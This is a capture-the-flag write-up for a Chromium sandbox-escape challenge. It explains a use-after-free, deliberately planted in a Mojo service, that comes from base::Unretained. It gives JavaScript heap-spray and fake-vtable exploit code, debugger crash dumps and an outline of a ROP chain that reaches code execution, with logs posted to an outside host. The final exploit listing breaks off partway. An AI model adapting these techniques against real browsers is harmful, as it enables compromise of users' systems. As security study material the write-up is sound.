# Fourchain - Sandbox

**Authors:** [Nspace](https://twitter.com/_MatteoRizzo)

**Tags:** pwn, browser, sandbox

**Points:** 384

> Pouring sand into boxes ? How boring is that 🥱

## Analysis

In this challenge the authors open a webpage with contents controlled by us with a vulnerable version of Chromium. The challenge simulates a compromised renderer process by giving JavaScript code access to Chromium's Mojo IPC (`--enable-blink-features=MojoJS`) and the flag is in a file that is not accessible from inside the sandbox. This means that we have to find a way to escape the sandbox by using the Mojo APIs.

As with the V8 challenge, we are given a patch that introduces the vulnerability that we have to exploit:

```diff
diff --git a/content/browser/BUILD.gn b/content/browser/BUILD.gn
index 0e81bb6da44ce..ba8af9ad8a3a9 100644
--- a/content/browser/BUILD.gn
+++ b/content/browser/BUILD.gn
@@ -2282,6 +2282,8 @@ source_set("browser") {
     "worker_host/worker_script_loader.h",
     "worker_host/worker_script_loader_factory.cc",
     "worker_host/worker_script_loader_factory.h",
+    "sandbox/sandbox_impl.h",
+    "sandbox/sandbox_impl.cc",
   ]
 
   # TODO(crbug.com/1327384): Remove `permissions_common`.
diff --git a/content/browser/browser_interface_binders.cc b/content/browser/browser_interface_binders.cc
index d0e12faf3f16a..0f599997dbb5f 100644
--- a/content/browser/browser_interface_binders.cc
+++ b/content/browser/browser_interface_binders.cc
@@ -14,6 +14,7 @@
 #include "build/branding_buildflags.h"
 #include "build/build_config.h"
 #include "cc/base/switches.h"
+#include "content/browser/sandbox/sandbox_impl.h"
 #include "content/browser/aggregation_service/aggregation_service_internals.mojom.h"
 #include "content/browser/aggregation_service/aggregation_service_internals_ui.h"
 #include "content/browser/attribution_reporting/attribution_internals.mojom.h"
@@ -110,6 +111,7 @@
 #include "storage/browser/quota/quota_manager_proxy.h"
 #include "third_party/blink/public/common/features.h"
 #include "third_party/blink/public/common/storage_key/storage_key.h"
+#include "third_party/blink/public/mojom/sandbox/sandbox.mojom.h"
 #include "third_party/blink/public/mojom/background_fetch/background_fetch.mojom.h"
 #include "third_party/blink/public/mojom/background_sync/background_sync.mojom.h"
 #include "third_party/blink/public/mojom/blob/blob_url_store.mojom.h"
@@ -982,6 +984,8 @@ void PopulateFrameBinders(RenderFrameHostImpl* host, mojo::BinderMap* map) {
   map->Add<blink::mojom::RenderAccessibilityHost>(
       base::BindRepeating(&RenderFrameHostImpl::BindRenderAccessibilityHost,
                           base::Unretained(host)));
+  map->Add<blink::mojom::Sandbox>(base::BindRepeating(
+      &RenderFrameHostImpl::CreateSandbox, base::Unretained(host)));
 }
 
 void PopulateBinderMapWithContext(
diff --git a/content/browser/renderer_host/render_frame_host_impl.cc b/content/browser/renderer_host/render_frame_host_impl.cc
index 142c6d093d80a..9f12815bf1def 100644
--- a/content/browser/renderer_host/render_frame_host_impl.cc
+++ b/content/browser/renderer_host/render_frame_host_impl.cc
@@ -2004,6 +2004,11 @@ RenderFrameHostImpl::~RenderFrameHostImpl() {
   TRACE_EVENT_END("navigation", perfetto::Track::FromPointer(this));
 }
 
+void RenderFrameHostImpl::CreateSandbox(
+    mojo::PendingReceiver<blink::mojom::Sandbox> receiver) {
+  SandboxImpl::Create(std::move(receiver));
+}
+
 int RenderFrameHostImpl::GetRoutingID() const {
   return routing_id_;
 }
diff --git a/content/browser/renderer_host/render_frame_host_impl.h b/content/browser/renderer_host/render_frame_host_impl.h
index c9c0155bc626e..11329de446f78 100644
--- a/content/browser/renderer_host/render_frame_host_impl.h
+++ b/content/browser/renderer_host/render_frame_host_impl.h
@@ -37,6 +37,7 @@
 #include "base/types/pass_key.h"
 #include "base/unguessable_token.h"
 #include "build/build_config.h"
+#include "content/browser/sandbox/sandbox_impl.h"
 #include "content/browser/accessibility/browser_accessibility_manager.h"
 #include "content/browser/accessibility/web_ax_platform_tree_manager_delegate.h"
 #include "content/browser/bad_message.h"
@@ -140,6 +141,7 @@
 #include "third_party/blink/public/mojom/portal/portal.mojom-forward.h"
 #include "third_party/blink/public/mojom/presentation/presentation.mojom-forward.h"
 #include "third_party/blink/public/mojom/render_accessibility.mojom.h"
+#include "third_party/blink/public/mojom/sandbox/sandbox.mojom.h"
 #include "third_party/blink/public/mojom/security_context/insecure_request_policy.mojom-forward.h"
 #include "third_party/blink/public/mojom/sms/webotp_service.mojom-forward.h"
 #include "third_party/blink/public/mojom/speech/speech_synthesis.mojom-forward.h"
@@ -1815,6 +1817,9 @@ class CONTENT_EXPORT RenderFrameHostImpl
   // Returns true if the frame is frozen.
   bool IsFrozen();
 
+  void CreateSandbox(
+      mojo::PendingReceiver<blink::mojom::Sandbox> receiver);
+
   // Set the `frame_` for sending messages to the renderer process.
   void SetMojomFrameRemote(mojo::PendingAssociatedRemote<mojom::Frame>);
 
diff --git a/content/browser/sandbox/sandbox_impl.cc b/content/browser/sandbox/sandbox_impl.cc
new file mode 100644
index 0000000000000..b03840e655d7d
--- /dev/null
+++ b/content/browser/sandbox/sandbox_impl.cc
@@ -0,0 +1,59 @@
+#include "content/browser/sandbox/sandbox_impl.h"
+#include "mojo/public/cpp/bindings/self_owned_receiver.h"
+#include "content/public/browser/browser_task_traits.h"
+#include "content/public/browser/browser_thread.h"
+
+namespace content {
+
+    size_t SandboxImpl::cnt = 0;
+
+    SandboxImpl::SandboxImpl() {
+        this->isProcess_ = false;
+        this->id_ = SandboxImpl::cnt;
+        SandboxImpl::cnt++;
+        memset(this->box_, 0, sizeof(this->box_));
+    }
+
+    SandboxImpl::~SandboxImpl() {
+        SandboxImpl::cnt--;
+    }
+
+    // static
+    void SandboxImpl::Create(
+        mojo::PendingReceiver<blink::mojom::Sandbox> receiver) {
+      auto self = std::make_unique<SandboxImpl>();
+      mojo::MakeSelfOwnedReceiver(std::move(self), std::move(receiver));
+    }
+
+    void SandboxImpl::GetTextAddress(GetTextAddressCallback callback) {
+        std::move(callback).Run((uint64_t)(&SandboxImpl::Create));
+    }
+
+    void SandboxImpl::GetHeapAddress(GetHeapAddressCallback callback) {
+        std::move(callback).Run((uint64_t)(this));
+    }
+
+    void SandboxImpl::PourSand(const std::vector<uint8_t>& sand) {
+        if ( this->isProcess_ || sand.size() > 0x1100 )  return;
+
+        this->isProcess_ = true;
+        content::GetIOThreadTaskRunner({})->PostTask(
+            FROM_HERE,  
+            base::BindOnce(&SandboxImpl::Pour, base::Unretained(this), sand)
+        );
+    }
+
+    void SandboxImpl::Pour(const std::vector<uint8_t>& sand) {
+        size_t sand_sz = sand.size(), i = 0;
+        if (sand_sz > 0x800) {
+            std::vector<uint8_t> sand_for_box(sand.begin(), sand.begin()+0x800);
+            this->backup_ = std::make_unique<std::vector<uint8_t>>(sand.begin()+0x800, sand.end());
+            this->PourSand(sand_for_box);
+        } else {
+            for ( i = 0 ; i < sand_sz ; i++) {
+                this->box_[i] = sand[i];
+            }
+        }
+        this->isProcess_ = false;
+    }
+} // namespace content
diff --git a/content/browser/sandbox/sandbox_impl.h b/content/browser/sandbox/sandbox_impl.h
new file mode 100644
index 0000000000000..81affb5a7f7dc
--- /dev/null
+++ b/content/browser/sandbox/sandbox_impl.h
@@ -0,0 +1,33 @@
+#ifndef CONTENT_BROWSER_SANDBOX_IMPL_H_
+#define CONTENT_BROWSER_SANDBOX_IMPL_H_
+
+#include <cstdint>
+#include <iostream>
+
+#include "content/common/content_export.h"
+#include "third_party/blink/public/mojom/sandbox/sandbox.mojom.h"
+
+namespace content {
+
+    class CONTENT_EXPORT SandboxImpl : public blink::mojom::Sandbox {
+        public:
+            static size_t cnt;
+            SandboxImpl();
+            ~SandboxImpl() override;
+            static void Create(
+                    mojo::PendingReceiver<blink::mojom::Sandbox> receiver);
+
+            void GetTextAddress(GetTextAddressCallback callback) override;
+            void GetHeapAddress(GetHeapAddressCallback callback) override;
+            void PourSand(const std::vector<uint8_t>& sand) override;
+
+        private:
+            void Pour(const std::vector<uint8_t>& sand);
+            size_t id_;
+            bool isProcess_;
+            uint8_t box_[0x800];
+            std::unique_ptr<std::vector<uint8_t>> backup_; 
+    };
+}  // namespace content
+
+#endif
diff --git a/third_party/blink/public/mojom/BUILD.gn b/third_party/blink/public/mojom/BUILD.gn
index 92fac884e82f5..6678a9d9876ac 100644
--- a/third_party/blink/public/mojom/BUILD.gn
+++ b/third_party/blink/public/mojom/BUILD.gn
@@ -228,6 +228,7 @@ mojom("mojom_platform") {
     "worker/worker_content_settings_proxy.mojom",
     "worker/worker_main_script_load_params.mojom",
     "worker/worker_options.mojom",
+    "sandbox/sandbox.mojom",
   ]
 
   if (is_android) {
diff --git a/third_party/blink/public/mojom/sandbox/sandbox.mojom b/third_party/blink/public/mojom/sandbox/sandbox.mojom
new file mode 100644
index 0000000000000..030ce033b377e
--- /dev/null
+++ b/third_party/blink/public/mojom/sandbox/sandbox.mojom
@@ -0,0 +1,7 @@
+module blink.mojom;
+
+interface Sandbox {
+    GetTextAddress() => (uint64 addr);
+    GetHeapAddress() => (uint64 addr);
+    PourSand(array<uint8> sand);
+};
```

We can see that the author added a new Mojo service that our exploit can access from the compromised renderer. The service exposes 3 methods to the renderer: `GetTextAddress`, `GetHeapAddress`, and `PourSand`. We can invoke these methods and get their results from JavaScript, after importing the JavaScript bindings.

```
interface Sandbox {
    GetTextAddress() => (uint64 addr);
    GetHeapAddress() => (uint64 addr);
    PourSand(array<uint8> sand);
};
```

```html
<html>
<head>

<script src="http://chain.galli.me:8080/mojo/mojo_bindings.js"></script>
<script src="http://chain.galli.me:8080/mojo/third_party/blink/public/mojom/sandbox/sandbox.mojom.js"></script>

<script>
let printbuf = [];
function print(msg) {
  printbuf.push(msg);
}

async function uploadLogs() {
  await fetch('http://chain.galli.me:8080/logs', {
    method: 'POST',
    body: printbuf.join('\n'),
  });
}

function hex(x) {
  return `0x${x.toString(16)}`;
}

async function pwn() {
  let sandbox = new blink.mojom.SandboxPtr();
  Mojo.bindInterface(blink.mojom.Sandbox.name, mojo.makeRequest(sandbox).handle);
  print(`Result: ${hex((await sandbox.getHeapAddress()).addr)}`);

  await uploadLogs();
}

pwn();
</script>
</head>
</html>
```

```
Result: 0x16f8003f1600
```

The implementations of the first two methods are straightforward and only give us some "free" pointer leaks:

```cpp
void SandboxImpl::GetTextAddress(GetTextAddressCallback callback) {
    std::move(callback).Run((uint64_t)(&SandboxImpl::Create));
}

void SandboxImpl::GetHeapAddress(GetHeapAddressCallback callback) {
    std::move(callback).Run((uint64_t)(this));
}
```

The implementation of `PourSand` is the interesting part:

```cpp
void SandboxImpl::PourSand(const std::vector<uint8_t>& sand) {
    if ( this->isProcess_ || sand.size() > 0x1100 )  return;
    this->isProcess_ = true;
    content::GetIOThreadTaskRunner({})->PostTask(
        FROM_HERE,  
        base::BindOnce(&SandboxImpl::Pour, base::Unretained(this), sand)
    );
}

void SandboxImpl::Pour(const std::vector<uint8_t>& sand) {
    size_t sand_sz = sand.size(), i = 0;
    if (sand_sz > 0x800) {
        std::vector<uint8_t> sand_for_box(sand.begin(), sand.begin()+0x800);
        this->backup_ = std::make_unique<std::vector<uint8_t>>(sand.begin()+0x800, sand.end());
        this->PourSand(sand_for_box);
    } else {
        for ( i = 0 ; i < sand_sz ; i++) {
            this->box_[i] = sand[i];
        }
    }
    this->isProcess_ = false;
}
```

The first thing that stands out is that `PourSand` doesn't directly call `Pour` and instead posts a task that runs `Pour` to the I/O thread's task queue and returns immediately. This means that `Pour` might only be called later, after `PourSand` returns, if the I/O thread is busy. This creates some object lifetime issues: what if the `SandboxImpl` instance (or `sand`) is gone by the time the task is executed? The code needs to make sure that both remain alive at least until `Pour` finishes executing.

The [chromium docs for `BindOnce`](https://chromium.googlesource.com/chromium/src/+/master/docs/callback.md#how-the-implementation-works) say this about lifetime management:

> By default base::Bind{Once, Repeating}() will store copies of all bound parameters, and attempt to refcount a target object if the function being bound is a class method. These copies are created even if the function takes parameters as const references.
>
> To change this behavior, we introduce a set of argument wrappers (e.g., base::Unretained()). These are simple container templates that are passed by value, and wrap a pointer to argument. Each helper has a comment describing it in base/bind.h.

So it appears that the contents of `sand` are copied and the copy is passed to `Pour` because `sand` is a const reference. But what about `this`? According to the documentation the default behavior would be to increment its refcount, but here the code is using `base::Unretained` which changes this. Let's check chromium's documentation for that:

```cpp
// Unretained() allows binding a non-refcounted class, and to disable
// refcounting on arguments that are refcounted objects.
```

> If a callback bound to a class method does not need cancel-on-destroy semantics (because there is some external guarantee that the class instance will always be live when running the callback), then use base::Unretained(). It is often a good idea to add a brief comment to explain why base::Unretained() is safe in this context; if nothing else, for future code archaeologists trying to fix a use-after-free bug.

`base::Unretained` disables refcounting and represents a promise from the caller that the object will remain alive until the callback finally runs. As the documentation notes, it can cause a use-after-free if not used carefully, and it looks like the challenge code might be vulnerable to this. This gives us a potential use-after-free on a `SandboxImpl`.

## Exploitation

In order to exploit the vulnerability the following things would have to happen, in order:

1. Our exploit calls `PourSand` on a `SandboxImpl` (let's call this `a`). This enqueues the call to `a->Pour` on the I/O thread.

1. `a` gets freed.

1. Our exploit reclaims `a`'s memory with a different object whose contents we control.

1. `Pour` runs with `this` pointing to controlled memory.

Freeing `a` is easy, we can do it from JavaScript by calling `.reset()` on the handle.

```js
let sandbox = new blink.mojom.SandboxPtr();
// Free the SandboxImpl
sandbox.ptr.reset();
```

Spraying should also be pretty easy because `Pour` conveniently creates a `std::vector<uint8_t>` with controlled data and size when `sand` is bigger than 0x800 bytes. All we need is a way to delay the execution of a freed `SandboxImpl`'s `Pour` callback. One idea is to post a lot of tasks to the I/O thread by calling `PourSand` over and over, and then free our target while the I/O thread is busy processing the callbacks:

```js
function newClient() {
  let iface = new blink.mojom.SandboxPtr();
  Mojo.bindInterface(blink.mojom.Sandbox.name, mojo.makeRequest(iface).handle);

  return iface;
}

async function pwn() {
  let clients = [];
  for (let i = 0; i < 1000; i++) {
    clients.push(newClient());
  }

  let spray = [];
  for (let i = 0; i < 100; i++) {
    spray.push(newClient());
  }

  let iface = newClient();

  // sizeof(class SandboxImpl) + 0x800
  let arg = new Uint8Array(0x1020);
  arg.fill(0x41);

  // Enqueue a lot of tasks on the I/O thread
  for (let i = 0; i < clients.length; i++) {
    clients[i].pourSand(arg);
  }

  for (let i = 0; i < 100; i++) {
    iface.pourSand(arg);
    iface.ptr.reset();
    iface = newClient();
  }

  for (let i = 0; i < spray.length; i++) {
    spray[i].pourSand(arg);
  }

  print('done');
}

pwn();
```

If we run this we get a very promising-looking crash:

```
Thread 8 "Chrome_IOThread" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff1504640 (LWP 12533)]
reset () at ../../buildtools/third_party/libc++/trunk/include/__memory/unique_ptr.h:281
281	      __ptr_.second()(__tmp);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
*RAX  0x2a8000ef7620 ◂— 0x0
*RBX  0x2a8000ef6e00 ◂— 0x4141414141414141 ('AAAAAAAA')
 RCX  0x41
*RDX  0x2a8000ef7600 ◂— 0x4141414141414141 ('AAAAAAAA')
*RDI  0x2a8001181aa0 —▸ 0x2a8000ef6e00 ◂— 0x4141414141414141 ('AAAAAAAA')
*RSI  0x800
*R8   0x2a8000ef6e00 ◂— 0x4141414141414141 ('AAAAAAAA')
*R9   0x7ffff1502ec4 ◂— 0x6e4ac20038323134 /* '4128' */
 R10  0x0
 R11  0x293
*R12  0x2a8000285000 ◂— 0x4141414141414141 ('AAAAAAAA')
*R13  0x2a8000286020 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
*R14  0x2a8000ef7620 ◂— 0x0
*R15  0x4141414141414141 ('AAAAAAAA')
 RBP  0x7ffff1503040 —▸ 0x7ffff15030d0 —▸ 0x7ffff1503350 —▸ 0x7ffff1503400 —▸ 0x7ffff1503420 ◂— ...
 RSP  0x7ffff1502ff0 —▸ 0x7ffff1503010 —▸ 0x2a80003de000 ◂— 0x6400000000
*RIP  0x55555b7b2132 ◂— mov rdi, qword ptr [r15]
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
 ► 0x55555b7b2132    mov    rdi, qword ptr [r15]
   0x55555b7b2135    test   rdi, rdi
   0x55555b7b2138    je     0x55555b7b2159                <0x55555b7b2159>
    ↓
   0x55555b7b2159    mov    rdi, r15
   0x55555b7b215c    call   free                <free>

   0x55555b7b2161    mov    rax, qword ptr [rbx]
   0x55555b7b2164    lea    rsi, [rbp - 0x40]
   0x55555b7b2168    mov    rdi, rbx
   0x55555b7b216b    call   qword ptr [rax + 0x20]

   0x55555b7b216e    mov    rdi, qword ptr [rbp - 0x40]
   0x55555b7b2172    test   rdi, rdi
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffff1502ff0 —▸ 0x7ffff1503010 —▸ 0x2a80003de000 ◂— 0x6400000000
01:0008│     0x7ffff1502ff8 —▸ 0x2a8001181aa0 —▸ 0x2a8000ef6e00 ◂— 0x4141414141414141 ('AAAAAAAA')
02:0010│     0x7ffff1503000 —▸ 0x2a80003dd800 ◂— 0x4141414141414141 ('AAAAAAAA')
03:0018│     0x7ffff1503008 —▸ 0x2a80003de000 ◂— 0x6400000000
04:0020│     0x7ffff1503010 —▸ 0x2a80003de000 ◂— 0x6400000000
05:0028│     0x7ffff1503018 —▸ 0x2a8000348000 ◂— 0x0
06:0030│     0x7ffff1503020 —▸ 0x7ffff15030f0 —▸ 0x5555636cb400 (base::DefaultTickClock::GetInstance()::default_tick_clock) —▸ 0x555562f48590 —▸ 0x555558e19a90 ◂— ...
07:0038│     0x7ffff1503028 —▸ 0x2a8000314780 —▸ 0x55556304c550 —▸ 0x55555cffbe60 (base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::~ThreadControllerWithMessagePumpImpl()) ◂— push rbp
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► f 0   0x55555b7b2132
   f 1   0x55555b7b2132
   f 2   0x55555b7b2132
   f 3   0x55555cfe4fe1 base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+257
   f 4   0x55555cfe4fe1 base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+257
   f 5   0x55555cffd32d base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+1277
   f 6   0x55555cffd32d base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+1277
   f 7   0x55555cffcc1f base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+127
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> bt
#0  reset () at ../../buildtools/third_party/libc++/trunk/include/__memory/unique_ptr.h:281
#1  operator= () at ../../buildtools/third_party/libc++/trunk/include/__memory/unique_ptr.h:215
#2  Pour() () at ../../content/browser/sandbox/sandbox_impl.cc:59
#3  0x000055555cfe4fe1 in Run () at ../../base/functional/callback.h:152
#4  RunTaskImpl() () at ../../base/task/common/task_annotator.cc:156
#5  0x000055555cffd32d in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:451:11)> () at ../../base/task/common/task_annotator.h:85
#6  DoWorkImpl() () at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:449
#7  0x000055555cffcc1f in DoWork() () at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:300
#8  0x000055555cffdab5 in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ()
#9  0x000055555d056723 in Run() () at ../../base/message_loop/message_pump_libevent.cc:292
#10 0x000055555cffde0b in Run() () at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:609
#11 0x000055555cfc3e19 in Run() () at ../../base/run_loop.cc:141
#12 0x000055555d01d0f8 in base::Thread::Run(base::RunLoop*) () at ../../base/threading/thread.cc:338
#13 0x000055555b138a60 in content::BrowserProcessIOThread::IOThreadRun(base::RunLoop*) () at ../../content/browser/browser_process_io_thread.cc:119
#14 0x000055555d01d217 in ThreadMain() () at ../../base/threading/thread.cc:408
#15 0x000055555d0449af in ThreadFunc() () at ../../base/threading/platform_thread_posix.cc:103
#16 0x00007ffff7168b43 in start_thread (arg=<optimized out>) at ./nptl/pthread_create.c:442
#17 0x00007ffff71faa00 in clone3 () at ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81

pwndbg> tele $r15
<Could not read memory at 0x4141414141414141>
```

It looks like Chromium is crashing in `Pour` where it assigns the new `std::vector` to `this->backup_`. This almost certainly happens because we've reclaimed the the object with our spray and so the code thinks that `this->backup_` already points to an object which must be freed. This is a good crash because it shows that we can indeed reclaim the freed object with controlled data, but it would much more useful if we could reach the following line which has a virtual function call. We can fix this crash by spraying a fake `SandboxImpl` that has `backup_` set to `nullptr` instead of 0x4141414141414141.

```js
let clients = [];
for (let i = 0; i < 1000; i++) {
  clients.push(newClient());
}

let spray = [];
for (let i = 0; i < 100; i++) {
  spray.push(newClient());
}

let iface = newClient();

let arg2 = new BigUint64Array(0x1020 / 8);
arg2.fill(0x4141414141414141n);
arg2[0x800 / 8 + 0x818 / 8] = 0n;
let arg = new Uint8Array(arg2.buffer);

for (let i = 0; i < clients.length; i++) {
  clients[i].pourSand(arg);
}

for (let i = 0; i < 100; i++) {
  iface.pourSand(arg);
  iface.ptr.reset();
  iface = newClient();
}

for (let i = 0; i < spray.length; i++) {
  spray[i].pourSand(arg);
}
```

```
Thread 8 "Chrome_IOThread" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff1504640 (LWP 12689)]
0x000055555b7b216b in Pour () at ../../content/browser/sandbox/sandbox_impl.cc:60
60	            this->PourSand(sand_for_box);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
*RAX  0x4141414141414141 ('AAAAAAAA')
*RBX  0x12c000ee7800 ◂— 0x4141414141414141 ('AAAAAAAA')
 RCX  0x0
*RDX  0x12c000ee8000 ◂— 0x4141414141414141 ('AAAAAAAA')
*RDI  0x12c000ee7800 ◂— 0x4141414141414141 ('AAAAAAAA')
 RSI  0x7ffff1503000 —▸ 0x12c0003dd800 ◂— 0x4141414141414141 ('AAAAAAAA')
*R8   0x12c000ee7800 ◂— 0x4141414141414141 ('AAAAAAAA')
 R9   0x7ffff1502ec4 ◂— 0x4abb410038323134 /* '4128' */
 R10  0x0
 R11  0x293
*R12  0x12c000285000 ◂— 0x4141414141414141 ('AAAAAAAA')
*R13  0x12c000286020 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
*R14  0x12c000ee8020 ◂— 0x0
 R15  0x0
 RBP  0x7ffff1503040 —▸ 0x7ffff15030d0 —▸ 0x7ffff1503350 —▸ 0x7ffff1503400 —▸ 0x7ffff1503420 ◂— ...
 RSP  0x7ffff1502ff0 —▸ 0x7ffff1503010 —▸ 0x12c0003de000 ◂— 0x6400000000
 RIP  0x55555b7b216b ◂— call qword ptr [rax + 0x20]
────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
   0x55555b7b2159    mov    rdi, r15
   0x55555b7b215c    call   free                <free>

   0x55555b7b2161    mov    rax, qword ptr [rbx]
   0x55555b7b2164    lea    rsi, [rbp - 0x40]
   0x55555b7b2168    mov    rdi, rbx
 ► 0x55555b7b216b    call   qword ptr [rax + 0x20]

   0x55555b7b216e    mov    rdi, qword ptr [rbp - 0x40]
   0x55555b7b2172    test   rdi, rdi
   0x55555b7b2175    je     0x55555b7b21cf                <0x55555b7b21cf>

   0x55555b7b2177    mov    rax, qword ptr [rbp - 0x38]
   0x55555b7b217b    mov    rcx, rax
─────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────────────────
In file: /stuff/chromium/src/content/browser/sandbox/sandbox_impl.cc
   57         if (sand_sz > 0x800) {
   58             std::vector<uint8_t> sand_for_box(sand.begin(), sand.begin()+0x800);
   59             this->backup_ = std::make_unique<std::vector<uint8_t>>(sand.begin()+0x800, sand.end());
 ► 60             this->PourSand(sand_for_box);
   61         } else {
   62             for ( i = 0 ; i < sand_sz ; i++) {
   63                 this->box_[i] = sand[i];
   64             }
   65         }
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffff1502ff0 —▸ 0x7ffff1503010 —▸ 0x12c0003de000 ◂— 0x6400000000
01:0008│     0x7ffff1502ff8 —▸ 0x12c001169ca0 —▸ 0x12c000ee7800 ◂— 0x4141414141414141 ('AAAAAAAA')
02:0010│ rsi 0x7ffff1503000 —▸ 0x12c0003dd800 ◂— 0x4141414141414141 ('AAAAAAAA')
03:0018│     0x7ffff1503008 —▸ 0x12c0003de000 ◂— 0x6400000000
04:0020│     0x7ffff1503010 —▸ 0x12c0003de000 ◂— 0x6400000000
05:0028│     0x7ffff1503018 —▸ 0x12c000348000 ◂— 0x0
06:0030│     0x7ffff1503020 —▸ 0x7ffff15030f0 —▸ 0x5555636cb400 (base::DefaultTickClock::GetInstance()::default_tick_clock) —▸ 0x555562f48590 —▸ 0x555558e19a90 ◂— ...
07:0038│     0x7ffff1503028 —▸ 0x12c000314780 —▸ 0x55556304c550 —▸ 0x55555cffbe60 (base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::~ThreadControllerWithMessagePumpImpl()) ◂— push rbp
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► f 0   0x55555b7b216b
   f 1   0x55555cfe4fe1 base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+257
   f 2   0x55555cfe4fe1 base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+257
   f 3   0x55555cffd32d base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+1277
   f 4   0x55555cffd32d base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+1277
   f 5   0x55555cffcc1f base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+127
   f 6   0x55555cffdab5
   f 7   0x55555d056723 base::MessagePumpLibevent::Run(base::MessagePump::Delegate*)+211
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

pwndbg> x/10gx $rdi
0x12c000ee7800:	0x4141414141414141	0x4141414141414141
0x12c000ee7810:	0x4141414141414141	0x4141414141414141
0x12c000ee7820:	0x4141414141414141	0x4141414141414141
0x12c000ee7830:	0x4141414141414141	0x4141414141414141
0x12c000ee7840:	0x4141414141414141	0x4141414141414141
```

Much better! We now have a virtual call with a controlled vtable pointer. The easiest way to exploit this is to store a fake vtable in the `box_` of a `SandboxImpl`, leak its address using `GetHeapAddress` and point our fake `SandboxImpl`'s vtable there for RIP control.

```js
  let fake = newClient();
  let fake_vtable = new BigUint64Array(0x800 / 8);

  fake_vtable.fill(0x41414141n);
  fake.pourSand(new Uint8Array(fake_vtable.buffer));

  const heap_leak = (await fake.getHeapAddress()).addr;
  let boxed_mem = BigInt(heap_leak) + 0x18n;
  print(`Fake VTable at: ${hex(boxed_mem)}`);

  let clients = [];
  for (let i = 0; i < 1000; i++) {
    clients.push(newClient());
  }

  let spray = [];
  for (let i = 0; i < 100; i++) {
    spray.push(newClient());
  }

  let iface = newClient();

  let arg2 = new BigUint64Array(0x1020 / 8);
  arg2.fill(0x4141414141414141n);
  arg2[0x800 / 8] = BigInt(boxed_mem) + 1n;
  arg2[0x800 / 8 + 0x818 / 8] = 0n;
  let arg = new Uint8Array(arg2.buffer);

  for (let i = 0; i < clients.length; i++) {
    clients[i].pourSand(arg);
  }

  for (let i = 0; i < 100; i++) {
    iface.pourSand(arg);
    iface.ptr.reset();
    iface = newClient();
  }

  for (let i = 0; i < spray.length; i++) {
    spray[i].pourSand(arg);
  }
```

```
Thread 8 "Chrome_IOThread" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff1504640 (LWP 12853)]
0x0000000041414141 in ?? ()
```

🥳

At this point we just have to set up a JOP + ROP chain near our fake VTable and use it to launch the flag printer. In short we jump to a stack pivot JOP gadget and point RSP to our fake vtable, then from there execute a ROP chain that runs `execve("/home/chrome/flag_printer")`. Nothing special. The chrome binary has a lot of gadgets so we don't even need to leak the address of libc.

`hitcon{d0nt_U53_uNR3+4N3d_uSe_W34k_PtR_1nStEaD}`

## Final exploit:

```html
<html>
<head>

<script src="http://chain.galli.me:8080/mojo/mojo_bindings.js"></script>
<script src="http://chain.galli.me:8080/mojo/third_party/blink/public/mojom/sandbox/sandbox.mojom.js"></script>

<script>
let printbuf = [];
function print(msg) {
  printbuf.push(msg);
}

async function uploadLogs() {
  await fetch('http://chain.galli.me:8080/logs', {
    method: 'POST',
    body: printbuf.join('\n'),
  });
}

function hex(x) {
  return `0x${x.toString(16)}`;
}

function newClient() {
  let iface = new blink.mojom.SandboxPtr();
  Mojo.bindInterface(blink.mojom.Sandbox.name, mojo.makeRequest(iface).handle);

  return iface;
}

async function sbx() {
  let fake = newClient();
  const heap_leak = (await fake.getHeapAddress()).addr;
  const text_leak = (await fake.getTextAddress()).addr;

